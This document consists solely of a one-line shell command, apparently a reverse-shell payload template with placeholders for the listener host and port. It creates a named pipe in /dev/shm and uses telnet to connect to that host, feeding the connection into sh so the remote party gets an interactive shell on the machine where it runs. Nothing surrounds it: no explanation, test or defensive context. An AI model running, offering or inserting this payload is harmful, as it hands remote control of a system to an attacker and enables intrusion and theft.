rm -f /dev/shm/p&&mknod /dev/shm/p p&&telnet {{ LHOST }} {{ LPORT }} 0</dev/shm/p|sh 1>/dev/shm/p
